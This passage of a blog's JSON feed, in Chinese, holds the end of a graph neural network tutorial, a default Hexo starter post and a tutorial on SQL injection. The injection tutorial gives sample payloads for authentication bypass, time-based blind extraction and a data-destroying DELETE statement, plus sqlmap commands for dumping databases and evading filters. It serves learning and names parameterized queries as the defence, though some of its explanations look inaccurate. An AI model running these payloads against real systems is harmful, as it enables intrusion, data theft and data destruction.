class=\"line\"><span class=\"keyword\">from</span> torch.nn <span class=\"keyword\">import</span> Linear</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch_geometric.nn <span class=\"keyword\">import</span> GCNConv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">GCN</span>(torch.nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(GCN, self).__init__()</span><br><span class=\"line\">        torch.manual_seed(<span class=\"number\">1234</span>)</span><br><span class=\"line\">        self.conv1 = GCNConv(dataset.num_features, <span class=\"number\">4</span>)</span><br><span class=\"line\">        self.conv2 = GCNConv(<span class=\"number\">4</span>, <span class=\"number\">4</span>)\t<span class=\"comment\"># 数字表示维度</span></span><br><span class=\"line\">        self.conv3 = GCNConv(<span class=\"number\">4</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">        self.classifier = Linear(<span class=\"number\">2</span>, dataset.num_classes)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x, edge_index</span>):       <span class=\"comment\"># edge_index 为邻接矩阵</span></span><br><span class=\"line\">        h = self.conv1(x, edge_index)</span><br><span class=\"line\">        h = h.tanh()    <span class=\"comment\"># 双曲正切函数</span></span><br><span class=\"line\">        h = self.conv2(h, edge_index)</span><br><span class=\"line\">        h = h.tanh()</span><br><span class=\"line\">        h = self.conv3(h, edge_index)</span><br><span class=\"line\">        h = h.tanh()  <span class=\"comment\"># Final GNN embedding space.</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Apply a final (linear) classifier.    全连接</span></span><br><span class=\"line\">        out = self.classifier(h)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> out, h</span><br><span class=\"line\"></span><br><span class=\"line\">model = GCN()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(model)</span><br><span class=\"line\"></span><br><span class=\"line\">Output:</span><br><span class=\"line\">    GCN(</span><br><span class=\"line\">  (conv1): GCNConv(<span class=\"number\">34</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">  (conv2): GCNConv(<span class=\"number\">4</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">  (conv3): GCNConv(<span class=\"number\">4</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">  (classifier): Linear(in_features=<span class=\"number\">2</span>, out_features=<span class=\"number\">4</span>, bias=<span class=\"literal\">True</span>)</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p>输出特征展示</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">_, h = model(data.x, data.edge_index)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Embedding shape: <span class=\"subst\">&#123;<span class=\"built_in\">list</span>(h.shape)&#125;</span>&#x27;</span>)</span><br><span class=\"line\">visualize(h, color=data.y)</span><br></pre></td></tr></table></figure>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<u><strong>可视化</strong></u></p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa8a441ddac507cc6d24ec.png\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>训练模型</strong>（半监督，semi—supervised）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> IPython.display <span class=\"keyword\">import</span> Javascript  <span class=\"comment\"># Restrict height of output cell.</span></span><br><span class=\"line\"></span><br><span class=\"line\">display(Javascript(<span class=\"string\">&#x27;&#x27;&#x27;google.colab.output.setIframeHeight(0, true, &#123;maxHeight: 430&#125;)&#x27;&#x27;&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">criterion = torch.nn.CrossEntropyLoss()  <span class=\"comment\"># Define loss criterion.</span></span><br><span class=\"line\">optimizer = torch.optim.Adam(model.parameters(), lr=<span class=\"number\">0.01</span>)  <span class=\"comment\"># Define optimizer.</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">train</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    optimizer.zero_grad()  <span class=\"comment\"># Clear gradients.</span></span><br><span class=\"line\">    out, h = model(data.x, data.edge_index)  <span class=\"comment\"># Perform a single forward pass.</span></span><br><span class=\"line\">    loss = criterion(out[data.train_mask],</span><br><span class=\"line\">                     data.y[data.train_mask])  <span class=\"comment\"># Compute the loss solely based on the training nodes.</span></span><br><span class=\"line\">    loss.backward()  <span class=\"comment\"># Derive gradients.</span></span><br><span class=\"line\">    optimizer.step()  <span class=\"comment\"># Update parameters based on gradients.</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> loss, h</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">401</span>):</span><br><span class=\"line\">    loss, h = train(data)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> epoch % <span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        visualize(h, color=data.y, epoch=epoch, loss=loss)</span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.3</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<strong><u>可视化</u></strong></p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa8a451ddac507cc6d26b7.png\" alt=\"\"></p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa8a461ddac507cc6d27a9.png\" alt=\"\"></p>\n</li>\n</ul>\n",
            "tags": [
                "GNN"
            ]
        },
        {
            "id": "http://aer0liteee.github.io/post/e73517db.html",
            "url": "http://aer0liteee.github.io/post/e73517db.html",
            "title": "SQL注入",
            "date_published": "2023-07-02T02:11:52.000Z",
            "content_html": "<h3 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h3>\n<ul>\n<li>\n<p>概念：</p>\n<ul>\n<li>所谓的 sql 注入就是通过某种方式<strong>将恶意的 sql 代码添加到输入参数</strong>中，然后传递到 sql 服务器使其解析并执行的一种攻击手法。</li>\n</ul>\n</li>\n<li>\n<p>示例：</p>\n<ul>\n<li>\n<p>假设有一个登录表单，应用程序使用提交的用户名和密码来构建 SQL 查询：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$username = $_POST[&#x27;username&#x27;];</span><br><span class=\"line\">$password = $_POST[&#x27;password&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">$sql = &quot;SELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure>\n<p>如果应用程序没有对用户输入进行适当的处理和转义，攻击者可能会在用户名字段中输入恶意代码，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--</span><br></pre></td></tr></table></figure>\n<p>在这种情况下，构建的 SQL 查询将变成：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE username = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--&#x27; AND password = &#x27;$password&#x27;</span><br></pre></td></tr></table></figure>\n<p>这个查询的条件始终成立（‘1’=‘1’），绕过了密码验证，从而使攻击者能够成功登录或绕过应用程序的安全措施。</p>\n<p>为了防止 SQL 注入攻击，应用程序应该始终对用户输入进行验证、过滤和转义。最好的防御措施之一是使用参数化查询或预编译语句，它们可以防止恶意的 SQL 代码注入。</p>\n</li>\n</ul>\n</li>\n<li>\n<p>基本步骤</p>\n<ul>\n<li>\n<p><strong>SQL 注入步骤</strong><br>\n（1）判断是否存在注入，注入是字符型还是数字型</p>\n<blockquote>\n<p>​\t\t首先 id 后面加单引号 查看是否可能存在 sql 注入，返回正常，不存在；返回不正常，存在</p>\n</blockquote>\n<p>（2）猜解 SQL 查询语句中的字段数<br>\n（3）判断哪些位置字段可以注入利用<br>\n（4）查询数据库（当前使用数据库或所有数据库）<br>\n（5）查询指定数据库中的表<br>\n（6）查询指定表中的字段名<br>\n（7）查询表中字段的值</p>\n</li>\n</ul>\n</li>\n<li>\n<p>常见方式：</p>\n<ul>\n<li>\n<p>可以将 SQL 注入分为两大类：<br>\n<strong>非盲注</strong>和<strong>盲注</strong>，<u>非盲注就是有报错回显</u>，<u>盲注就是没有报错回显</u></p>\n</li>\n<li>\n<p>常见的 SQL 注入方法有：</p>\n<ul>\n<li>\n<p><strong>联合注入</strong></p>\n<ul>\n<li>\n<p>原理<br>\n（1）<strong>union select</strong> 定义<br>\n将多个 SELECT 语句的结果合并到一个结果集中<br>\n（2）mysql 直观测试</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">复制代码<span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> users <span class=\"keyword\">WHERE</span> id<span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>相关函数</p>\n<ul>\n<li>group_concat (参数 1，参数 2，参数 3 等等无数个参数) 语法： <strong>group_concat</strong> 函数<u>返回一个字符串结果</u>(就是返回一行)，该结果由括号中的各个参数值执行然后连接组合而成</li>\n<li>char ()：还原 ASCII 码为字符</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>布尔盲注</strong></p>\n<ul>\n<li>\n<p>原理<br>\n Web 的页面的<u>仅仅会返回 True 和 False</u>，那么布尔盲注就是根据页面返回的 True 或者是 False 来得到数据库中的相关信息</p>\n</li>\n<li>\n<p>相关函数解析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">length：返回值为字符串的字节长度</span><br><span class=\"line\">ascii：把字符转换成ascii码值的函数</span><br><span class=\"line\">substr(str, pos, len)：在str中从pos开始的位置（起始位置为1），截取len个字符</span><br><span class=\"line\">count：统计表中记录的一个函数，返回匹配条件的行数</span><br><span class=\"line\">limit：</span><br><span class=\"line\">     limit m ：检索前m行数据，显示1-10行数据（m&gt;0）</span><br><span class=\"line\">     limit(x,y)：检索从x+1行开始的y行数据</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>时间盲注</strong></p>\n<ul>\n<li>\n<p>原理：</p>\n<ul>\n<li>时间盲注的一般思路是延迟注入，就是利用<strong> sleep ()<strong> 或</strong> benchmark ()<strong> 等函数让 mysql 执行时间变长并结合判断条件语句 if (expr1,expr2,expr3)，然后</strong>通过页面的响应时间长短</strong>来判断语句返回的值是 True 还是 False，从而猜解一些未知的字段</li>\n</ul>\n</li>\n<li>\n<p>相关函数：</p>\n<ul>\n<li>if (expr1,expr2,expr3)： expr1 的值为 TRUE，则返回值为 expr2 ；expr1 的值为 FALSE，则返回值为 expr3<br>\nsleep (n)：延迟响应时间 n 秒</li>\n</ul>\n</li>\n<li>\n<p>示例：</p>\n<ul>\n<li>\n<p>假设有一个搜索功能，用户可以在网站上搜索电影标题。搜索功能的查询语句通过将用户提供的搜索关键字嵌入到 SQL 查询中来生成结果。例如，查询语句如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM movies WHERE title LIKE &#x27;%用户输入的关键字%&#x27;</span><br></pre></td></tr></table></figure>\n<p>这个查询语句会返回包含用户搜索关键字的电影标题。</p>\n<p>攻击者可以利用时间盲注来判断特定条件是否满足，例如是否存在一个特定的电影。</p>\n<p>假设攻击者要判断电影名称为 “The Matrix” 是否存在。攻击者可以通过向搜索字段输入恶意的搜索字符串来触发时间延迟，如果延迟时间较长，则可以推断条件为真，否则推断为假。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">搜索关键字：&#x27; OR IF(SUBSTRING((SELECT title FROM movies WHERE title = &#x27;The Matrix&#x27;),1,1)=&#x27;T&#x27;, SLEEP(5), 0) AND &#x27;1%&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>在上述示例中，攻击者通过构造恶意的搜索字符串进行注入。该字符串使用  <code>IF</code>  函数和  <code>SLEEP</code>  函数来引起延迟，在查询执行期间等待 5 秒钟。如果条件  <code>SUBSTRING((SELECT title FROM movies WHERE title = 'The Matrix'),1,1)='T'</code>  为真，即判断电影名称的第一个字符是 ‘T’，则会发生延迟。</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>宽字节注入</strong></p>\n<ul>\n<li>\n<p>原理：</p>\n<ul>\n<li>当存在宽字节注入的时候，注入参数里带入％df％27，即可把（％5c）吃掉，也就是 % df 和 %5c 结合成了汉字運</li>\n</ul>\n</li>\n<li>\n<p>示例：</p>\n<ul>\n<li></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$userid = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$query = &quot;SELECT * FROM users WHERE id = &#x27;$userid&#x27;&quot;;</span><br></pre></td></tr></table></figure>\n<p>在正常情况下，如果用户提供的  <code>id</code>  参数是单字节编码，应用程序会将其包含在查询字符串中。然而，通过在  <code>id</code>  参数中使用宽字节编码，攻击者可以绕过过滤机制，将恶意注入的 SQL 代码作为有效数据执行。例如，假设攻击者提供的  <code>id</code>  参数是  <code>%bf' OR '1'='1</code> ，其中  <code>%bf</code>  是宽字节编码的  <code>'</code>  。</p>\n<p>在这种情况下，构建的 SQL 查询变成了：</p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE id = &#x27;�&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>\n<p>这将导致查询条件始终为真（‘1’=‘1’），从而绕过了应用程序的身份验证，可能导致数据泄露、修改或其他安全问题。</p>\n<p>为了防止宽字节注入攻击，应用程序应该正确处理和验证输入的数据，特别是字符编码方面。建议采用参数化查询或使用安全的编码和解码机制，以避免受到这种类型的注入攻击。</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>报错注入</strong></p>\n<ul>\n<li>\n<p>原理：</p>\n<ul>\n<li>报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。</li>\n</ul>\n</li>\n<li>\n<p>相关函数：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"code\"><pre><span class=\"line\">·<span class=\"built_in\">concat</span>()函数：用于将多个字符串连接成一个字符串</span><br><span class=\"line\">·<span class=\"built_in\">floor</span>(x) 函数：返回小于 x 的最大整数值</span><br><span class=\"line\">·<span class=\"built_in\">rand</span>()函数调：用可以在<span class=\"number\">0</span>和<span class=\"number\">1</span>之间产生一个随机数</span><br><span class=\"line\">·group by语句：根据一个或多个列对结果集进行分组</span><br><span class=\"line\">·<span class=\"built_in\">updatexml</span>(目标xml文档，xml路径，更新的内容)：更新xml文档的函数，xpath_expr： 需要更新的xml路径(Xpath格式)</span><br><span class=\"line\">·new_xml： 更新后的内容</span><br><span class=\"line\">此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 xml_target 新的XML片段 new_xml ，然后返回更改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。</span><br><span class=\"line\"><span class=\"built_in\">extractvalue</span>(目标xml文档，xml路径)：对XML文档进行查询的函数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>示例：</p>\n<ul>\n<li>\n<p>假设有一个登录页面，您需要输入用户名和密码进行身份验证。该应用程序使用以下查询语句进行验证：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE username = &#x27;输入的用户名&#x27; AND password = &#x27;输入的密码&#x27;</span><br></pre></td></tr></table></figure>\n<p>攻击者可以使用报错注入来利用应用程序中的错误消息来获取敏感信息，例如数据库的名称、表的名称等。</p>\n<p>以下是一个示例的报错注入攻击：</p>\n<p>假设攻击者要尝试通过报错注入来获取数据库的名称。攻击者在用户名字段中输入以下内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27; OR 1=1 ORDER BY 1--</span><br></pre></td></tr></table></figure>\n<p>在这个例子中，攻击者向用户名字段中注入了恶意代码，即  <code>' OR 1=1 ORDER BY 1--</code> 。这段代码仅仅是为了触发报错，而不是以正常的方式进行身份验证。</p>\n<p>当应用程序执行查询时，由于注入的代码的存在，查询将变成以下形式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE username = &#x27;&#x27; OR 1=1 ORDER BY 1--&#x27; AND password = &#x27;输入的密码&#x27;</span><br></pre></td></tr></table></figure>\n<p>上述查询中的  <code>ORDER BY 1</code>  是一种常见的错误引起的操作。如果查询执行成功，将不会发生错误，但如果查询失败，应用程序通常会显示错误消息或异常信息。</p>\n<p>通过观察错误消息或异常信息，攻击者可以推断出数据库的名称，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Error: Unknown column &#x27;1&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>从错误消息中，攻击者可以推断出数据库中存在一个名为  <code>1</code>  的列，这暗示了数据库中的一些结构信息。</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>堆叠注入</strong></p>\n<ul>\n<li>\n<p>原理</p>\n<ul>\n<li>堆叠注入与受限于 select 语句的联合查询法相反，堆叠注入可用于执行任意 SQL 语句，<u>简单地说就是 MYSQL 的多语句查询</u></li>\n<li>堆叠注入的局限性：堆叠注入并不是在任何换环境下都可以执行的，可能受到 API 或者数据库引擎不支持的限制（如 Oracle 数据库），也有可能权限不足。web 系统中，因为代码通常只返回一个查询结果，因此堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。</li>\n</ul>\n</li>\n<li>\n<p>示例：</p>\n<ul>\n<li>\n<p>假设我们有一个简单的登录表单，用于验证用户的用户名和密码。应用程序使用传递的用户名和密码构建 SQL 查询：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$username = $_POST[&#x27;username&#x27;];</span><br><span class=\"line\">$password = $_POST[&#x27;password&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">$sql = &quot;SELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure>\n<p>在这个例子中，应用程序没有正确地验证和过滤用户输入，存在 SQL 注入漏洞。</p>\n<p>下面是堆叠注入的示例攻击：</p>\n<p>假设攻击者在用户名字段中输入了以下内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin&#x27; OR 1=1; --</span><br></pre></td></tr></table></figure>\n<p>在这种情况下，构建的 SQL 查询将变成：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE username = &#x27;admin&#x27; OR 1=1; --&#x27; AND password = &#x27;$password&#x27;</span><br></pre></td></tr></table></figure>\n<p>这个查询中的  <code>OR 1=1; --</code>  部分是攻击者注入的恶意代码。它将使查询条件始终为真，因为  <code>1=1</code>  恒为真。 <code>--</code>  是 SQL 的注释标记，用于注释掉原始查询中的剩余部分。结果是，攻击者可以成功绕过身份验证，登录到系统中，即使他们提供了错误的密码。</p>\n<p><strong>堆叠注入的关键是在注入点中添加分号  <code>;</code>  来结束原始查询，然后添加额外的 SQL 语句来实现攻击者想要的恶意行为。这种技术可用于执行任意的 SQL 语句，如插入、更新或删除数据，甚至执行系统命令等。</strong></p>\n<p>要防止堆叠注入攻击，应用程序应该对所有用户输入进行正确的验证和转义，或者更好地使用参数化查询或预编译语句。这样可以防止注入的 SQL 代码被认为是有效的查询语句的一部分。确保在编写应用程序时实施严格的输入验证和过滤机制是至关重要的，以减少安全漏洞的出现</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>二次注入</strong></p>\n<ul>\n<li>\n<p>原理</p>\n<ul>\n<li>\n<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中（比如虽然参数在过滤后会添加 &quot;“进行转义，但是”&quot; 并不会插入到数据库中），当<u>Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入</u>。</p>\n<p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fe7f5e853e9b4717949e71a1d10c229b~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp\" alt=\"在这里插入图片描述\"></p>\n<p>二次注入，可以概括为以下两步：</p>\n</li>\n<li>\n<p>第一步：插入恶意数据</p>\n<ul>\n<li>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>\n</ul>\n</li>\n<li>\n<p>第二步：引用恶意数据</p>\n<ul>\n<li>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>示例：</p>\n<ul>\n<li>\n<p>用户 A 在评论中输入以下内容：  <code>Nice post! Please check out my website at www.example.com'; DELETE FROM comments; --</code></p>\n<p>应用程序将评论内容存储在数据库中，但并不立即执行。当其他用户访问留言板页面时，应用程序从数据库中获取评论并将其显示在页面上。在获取评论的过程中，存在不当的代码执行，导致用户 A 注入的恶意代码被执行。</p>\n</li>\n<li>\n<p>在这个示例中，用户 A 在评论中注入了一个恶意代码，即  <code>'; DELETE FROM comments; --</code> 。这段代码旨在删除数据库中的评论表中的所有内容。由于应用程序在处理评论时存在漏洞，并没有正确地过滤或转义用户输入，导致注入的恶意代码被存储在数据库中。当其他用户访问留言板页面时，应用程序从数据库中检索评论并显示在页面上，但由于存在不当的代码执行，导致用户 A 注入的恶意代码被执行，从而删除了评论表中的所有内容。</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>SQLMap 使用</p>\n<ul>\n<li>\n<p>常见参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">diff复制代码-u：指定含有参数的URL</span><br><span class=\"line\">--dbs：爆出数据库</span><br><span class=\"line\">--batch：默认选择执行</span><br><span class=\"line\">--random-agent：使用随机user-agent</span><br><span class=\"line\">-r：POST注入</span><br><span class=\"line\">--level：注入等级，一共有5个等级（1-5） 不加 level 时，默认是1，5级包含的payload最多，会自动破解出cookie、XFF等头部注入，相对应他的速度也比较慢</span><br><span class=\"line\">--timeout：设定重试超时</span><br><span class=\"line\">--cookie：设置cookie信息</span><br><span class=\"line\">--flush-session：删除指定目标缓存，重新对该目标进行测试</span><br><span class=\"line\">--tamper：使用waf绕过脚本</span><br><span class=\"line\">--time-sec：设定延时时间，默认是5秒</span><br><span class=\"line\">--thread：多线程，默认为1，最大为10</span><br><span class=\"line\">--keep-live： sqlmap默认是一次连接成功后马上关闭；HTTP报文中相当于Connection: Close（一次连接马上关闭）。要扫描站点的URL</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>对 url 进行检测，判断是否存在 SQL 注入</strong></p>\n<ul>\n<li>python <a href=\"http://sqlmap.py\">sqlmap.py</a> -u “url” --batch</li>\n</ul>\n</li>\n<li>\n<p><strong>获取数据库</strong></p>\n<ul>\n<li>python <a href=\"http://sqlmap.py\">sqlmap.py</a> -u URL --dbs --batch 获取全部数据库</li>\n<li>python <a href=\"http://sqlmap.py\">sqlmap.py</a> -u URL --current-db --batch 获取当前数据库</li>\n</ul>\n</li>\n<li>\n<p><a href=\"http://sqlmap.py\">sqlmap.py</a> -u “<a href=\"http://url/news?id=1\">http://url/news?id=1</a>”  --dump -C “column_name” -T “table_name” -D “db_name”</p>\n</li>\n<li>\n<p><strong>POST 注入</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -u “http://url/news/” --data=&quot;id=2” --cookie=&quot;&quot; //加cookie</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>使用 sqlmap 自带的过 waf 脚本：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u “http://test.com/test.php?Id=1” --tamper[“脚本名称”]（如果脚本失效，可以自定义脚本）</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://aer0liteee.github.io/post/4a17b156.html",
            "url": "http://aer0liteee.github.io/post/4a17b156.html",
            "title": "Hello World",
            "date_published": "2023-07-01T01:43:38.368Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}